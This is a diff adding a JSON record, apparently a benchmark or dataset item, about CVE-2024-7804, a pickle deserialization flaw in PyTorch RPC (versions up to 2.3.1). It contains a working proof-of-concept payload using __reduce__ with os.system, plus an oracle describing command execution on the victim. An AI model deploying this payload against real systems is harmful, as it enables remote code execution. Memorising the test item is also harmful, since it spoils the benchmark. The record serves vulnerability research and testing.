@@ -1,0 +1,15 @@
+{
+  "file_id": "895_torch_huntr_0e870eeb-f924-4054-8fac-d926b1fb7259",
+  "numeric_id": "895",
+  "library_hint": "torch",
+  "source": "huntr",
+  "title": "Deserialization of untrusted data in PyTorch RPC framework leading to remote code execution",
+  "cve": "CVE-2024-7804",
+  "cwe": "CWE-502: Deserialization of Untrusted Data",
+  "library": "pytorch",
+  "affected_version": "<= 2.3.1",
+  "vulnerable_function": "pickle.Unpickler.load",
+  "triggerability": "indirect",
+  "trigger_payload": "import os\nclass Unsec(object):\n    def __reduce__(self):\n        return (os.system,('id',))\n(pickled_python_udf, tensors) = _default_pickler.serialize(\n    Unsec()\n)\nfut = _invoke_rpc_python_udf(\n    dst_worker_info,\n    pickled_python_udf,\n    tensors,\n    rpc_timeout,\n    is_async_exec\n)",
+  "oracle": "The os.system('id') command is executed on the victim's master device, as evidenced by the output of the id command in the terminal."
+}
